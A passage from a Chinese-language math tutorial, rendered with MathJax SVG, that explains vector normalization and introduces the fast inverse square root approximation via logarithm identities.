<p>归一化向量的计算公式如下： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -4.118ex;" xmlns="http://www.w3.org/2000/svg" width="19.319ex" height="6.649ex" role="img" focusable="false" viewBox="0 -1119 8539 2939"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,17) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z"></path></g></g></g><g data-mml-node="mo" transform="translate(762.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(1818.6,0)"><g data-mml-node="mi" transform="translate(3117.7,676)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="msqrt" transform="translate(220,-1171.5)"><g transform="translate(1020,0)"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(518,-247) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(1194.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(2194.9,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(518,-247) scale(0.707)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3338.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(4338.9,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(518,-247) scale(0.707)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0,1.5)"><path data-c="221A" d="M1001 1150Q1017 1150 1020 1132Q1020 1127 741 244L460 -643Q453 -650 436 -650H424Q423 -647 423 -645T421 -640T419 -631T415 -617T408 -594T399 -560T385 -512T367 -448T343 -364T312 -259L203 119L138 41L111 67L212 188L264 248L472 -474L983 1140Q988 1150 1001 1150Z"></path></g><rect width="5260.5" height="60" x="1020" y="1091.5"></rect></g><rect width="6480.5" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span> 其中，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.2ex" height="1.359ex" role="img" focusable="false" viewBox="0 -443 972.5 600.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></g></svg></mjx-container></span>, <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.667ex;" xmlns="http://www.w3.org/2000/svg" width="2.069ex" height="1.67ex" role="img" focusable="false" viewBox="0 -443 914.5 738"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>, <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.029ex" height="1.359ex" role="img" focusable="false" viewBox="0 -443 896.8 600.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g></g></g></g></svg></mjx-container></span> 分别是向量 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.097ex" height="1.027ex" role="img" focusable="false" viewBox="0 -443 485 454"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g></g></g></svg></mjx-container></span> 在 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>, <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>, 和 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.052ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 465 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g></g></g></svg></mjx-container></span> 方向上的分量。</p>
<p>直接计算倒数平方根的方法，即先计算平方根再求倒数，速度非常慢，因为这两项操作虽然在硬件中实现，但仍然非常耗时。</p>
<p>然而，存在一种非常高效的近似算法，它利用了浮点数在内存中的存储方式。事实上，这个算法非常优秀，以至于它被直接实现到硬件中，因此它对软件开发者来说不再那么重要。然而，考虑到它的内在美和教育价值，仍然值得我们深入探讨。</p>
<h5 id="近似对数的计算">近似对数的计算</h5>
<p>根据对数的性质，有如下恒等式： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.308ex;" xmlns="http://www.w3.org/2000/svg" width="20.93ex" height="5.344ex" role="img" focusable="false" viewBox="0 -1342 9251 2362"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1714.6,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mfrac" transform="translate(1881.2,0)"><g data-mml-node="mn" transform="translate(682.5,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="msqrt" transform="translate(220,-803)"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(0,-17)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="572" height="60" x="853" y="723"></rect></g><rect width="1625" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(4024,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(5079.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(5857.8,0)"><g data-mml-node="mn" transform="translate(220,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="700" height="60" x="120" y="220"></rect></g><g data-mml-node="msub" transform="translate(6797.8,0)"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(8512.3,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mi" transform="translate(8679,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 